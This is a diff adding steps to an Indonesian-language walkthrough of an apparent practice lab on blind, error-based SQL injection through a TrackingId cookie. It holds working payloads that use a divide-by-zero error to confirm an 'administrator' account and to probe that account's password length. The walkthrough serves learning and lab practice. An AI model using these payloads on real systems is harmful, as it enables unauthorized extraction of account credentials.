@@ -22,4 +22,20 @@ TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM 
 Karena 1=1 adalah benar, database terpaksa mengeksekusi THEN TO_CHAR(1/0). Karena angka tidak bisa dibagi nol, database akan mogok kerja dan memicu status eror 500.
 
 
+
 (Jangan lupa untuk memblokir mantra tambahanmu lalu tekan Ctrl + U untuk melakukan URL-Encode agar tandanya tidak rusak di jalur Cookie).
+
+Langkah 3: Memastikan Keberadaan Akun Administrator
+Jika saklar eror di atas sudah bekerja dengan akurat (Benar = Eror 500, Salah = Normal 200), kita ganti kondisi 1=1 tadi untuk memeriksa apakah ada username administrator di tabel users:
+...xyz' || (SELECT CASE WHEN (USERNAME='administrator') THEN TO_CHAR(1/0) ELSE NULL END FROM users) || '
+Jika hasil kirimanmu memicu Eror 500, berarti akun admin valid ditemukan!
+
+<img width="1513" height="705" alt="image" src="https://github.com/user-attachments/assets/de926497-c8d7-437b-8cb9-37b4dd431ee2" />
+
+
+
+Langkah 4: Menentukan Panjang Password
+Sama seperti Lab 10, kita gunakan fungsi LENGTH(password) di dalam kotak kondisi CASE WHEN:
+...SELECT CASE WHEN (LENGTH(password)>19) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator'...
+Uji secara bertahap angkanya untuk mengonfirmasi panjang password-nya (biasanya bernilai 20 karakter).
+
